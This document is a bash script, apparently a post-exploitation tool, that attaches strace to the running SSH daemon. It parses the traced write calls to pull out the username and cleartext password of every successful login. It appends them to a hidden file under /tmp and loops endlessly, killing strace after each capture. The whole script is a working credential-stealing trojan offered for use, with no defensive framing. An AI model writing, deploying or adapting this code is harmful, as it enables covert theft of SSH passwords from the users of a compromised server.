#!/bin/bash

# Output file path
store_file='/tmp/.log_sshtrojan1.txt'
strace_sshd_log='/tmp/.strace_sshd.log'

if [[ ! -e $store_file ]]; then
	touch $store_file
fi

# Make sure the SSH daemon is running
sshd=$(ps aux | grep sshd | grep listener)
if [[ -z "$sshd" ]]; then
	echo "The SSH server daemon is not running. Please start it."
	exit 1
fi

# Make sure strace is installed
strace=$(which strace)
if [[ -z "$strace" ]]; then
        echo "Strace cannot be found. Please install it."
        exit 1
fi

# Function to extract username and password(s) from strace logs
function parse_credentials () {

	# check whether login successful
	if [[ $(cat $1 | grep 'Accepted password') ]]; then
		echo "login successful"

		# Begin parse the username and password
		username=$(cat $1 | awk '/Accepted password/ {print $10}')
		password=$(cat $1 | grep -A 1 -E 'write\(5,.*\\x00\\x00\\x00.*\\x0c.*5$' | tail -n 1 | cut -d '"' -f2 | cut -c 17-)

		echo -e "Username: $username, password: $password" >>  $store_file

	fi

	# Kill the strace process to handle new connection
	kill -9 $(pgrep strace)

}

while [ 1 ]; do
	
	# Find the sshd server pid
	pid=$(pgrep -o sshd)

	if [ -n "$pid" ]; then
		# Empty the strace log file
		echo '' > $strace_sshd_log

		# Strace the sshd service in background
		strace -qfvx -s 1024 -e trace=write,sendto -p "$pid" -o $strace_sshd_log &
		
		# Check the log file and wait until user authenticated successfully or failed three time
		while [[ ! $(cat $strace_sshd_log | grep 'Accepted password') && ! $(cat $strace_sshd_log | grep 'PAM 2 more authentication failures') ]]; do
			:
		done

		# Begin parse the credentials
		parse_credentials $strace_sshd_log
	fi
done